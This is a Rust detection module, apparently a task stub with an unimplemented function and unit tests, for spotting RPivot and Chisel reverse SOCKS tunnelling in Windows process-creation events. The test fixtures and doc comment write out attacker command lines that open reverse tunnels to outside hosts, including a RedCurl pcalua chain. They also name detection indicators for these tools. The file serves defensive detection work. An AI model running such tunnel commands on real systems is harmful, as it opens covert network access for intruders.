//! Detect RPivot / Chisel reverse proxy / SOCKS5 tunnel execution (T1090).

use forensicnomicon::heuristics::evtx::{
    CHISEL_CMDLINE_INDICATORS, EID_PROCESS_CREATE, EID_SYSMON_PROCESS_CREATE, RPIVOT_CMDLINE_INDICATORS,
    SYSMON_CHANNEL,
};
use winevt_core::EvtxEvent;

use crate::{EvtxDetection, EvtxDetectionKind};

/// Detect RPivot or Chisel tunnel tool execution.
///
/// Two sub-detectors fire under this kind:
/// 1. **Chisel** — `CommandLine` contains any of `CHISEL_CMDLINE_INDICATORS`
///    (e.g. `--reverse`, `R:socks`, `socks5`, `--tls-skip-verify`).
/// 2. **RPivot** — `CommandLine` contains any of `RPIVOT_CMDLINE_INDICATORS`
///    (e.g. `cl.py`, `client.py`, `--headless`).  The RedCurl-specific chain
///    is `pcalua.exe -a conhost.exe -c --headless python.exe cl.py`.
///
/// Both fire on EID 4688 (Security) or Sysmon EID 1, checking `CommandLine`.
pub fn detect_rpivot_chisel(events: &[EvtxEvent]) -> Vec<EvtxDetection> {
    todo!()
}

fn cmdline<'a>(ev: &'a winevt_core::EvtxEvent) -> Option<&'a str> {
    ev.data.get("CommandLine").map(String::as_str)
}

fn is_process_event(ev: &winevt_core::EvtxEvent) -> bool {
    (ev.event_id == EID_PROCESS_CREATE && ev.channel == "Security")
        || (ev.event_id == EID_SYSMON_PROCESS_CREATE && ev.channel == SYSMON_CHANNEL)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_helpers::make_event;

    #[test]
    fn chisel_socks5_detected() {
        let ev = make_event(
            EID_SYSMON_PROCESS_CREATE,
            SYSMON_CHANNEL,
            &[
                ("Image", "C:\\ProgramData\\tools\\chisel.exe"),
                ("CommandLine", "chisel.exe client --reverse socks5 10.10.0.1:8080"),
            ],
        );
        let hits = detect_rpivot_chisel(&[ev]);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].kind, EvtxDetectionKind::RpivotChisel);
        assert_eq!(hits[0].mitre_technique_id, "T1090");
    }

    #[test]
    fn chisel_tls_skip_verify_detected() {
        let ev = make_event(
            EID_PROCESS_CREATE,
            "Security",
            &[
                ("NewProcessName", "C:\\Temp\\relay.exe"),
                ("CommandLine", "relay.exe client --tls-skip-verify 192.168.1.1:443 R:socks"),
            ],
        );
        assert!(!detect_rpivot_chisel(&[ev]).is_empty());
    }

    #[test]
    fn rpivot_cl_py_detected() {
        let ev = make_event(
            EID_SYSMON_PROCESS_CREATE,
            SYSMON_CHANNEL,
            &[
                ("Image", "C:\\ProgramData\\redcurl\\python.exe"),
                ("CommandLine", "python.exe cl.py --s 109.206.236.209 --p 10310"),
            ],
        );
        assert!(!detect_rpivot_chisel(&[ev]).is_empty());
    }

    #[test]
    fn rpivot_pcalua_headless_chain_detected() {
        let ev = make_event(
            EID_SYSMON_PROCESS_CREATE,
            SYSMON_CHANNEL,
            &[
                ("Image", "C:\\Windows\\System32\\pcalua.exe"),
                (
                    "CommandLine",
                    "pcalua.exe -a conhost.exe -c --headless python.exe cl.py --s 10.0.0.1 --p 443",
                ),
            ],
        );
        assert!(!detect_rpivot_chisel(&[ev]).is_empty());
    }

    #[test]
    fn benign_python_not_detected() {
        let ev = make_event(
            EID_SYSMON_PROCESS_CREATE,
            SYSMON_CHANNEL,
            &[
                ("Image", "C:\\Python311\\python.exe"),
                ("CommandLine", "python.exe manage.py runserver"),
            ],
        );
        assert!(detect_rpivot_chisel(&[ev]).is_empty());
    }

    #[test]
    fn wrong_event_id_not_detected() {
        let ev = make_event(
            4104,
            SYSMON_CHANNEL,
            &[("CommandLine", "chisel.exe client --reverse socks5")],
        );
        assert!(detect_rpivot_chisel(&[ev]).is_empty());
    }

    #[test]
    fn evidence_contains_matched_indicator() {
        let ev = make_event(
            EID_SYSMON_PROCESS_CREATE,
            SYSMON_CHANNEL,
            &[
                ("Image", "C:\\Temp\\chisel.exe"),
                ("CommandLine", "chisel.exe client --reverse R:socks 10.0.0.1:8080"),
            ],
        );
        let hits = detect_rpivot_chisel(&[ev]);
        assert!(!hits.is_empty());
        let combined = hits[0].evidence.join(" ");
        assert!(combined.contains("chisel") || combined.contains("R:socks") || combined.contains("--reverse"));
    }
}
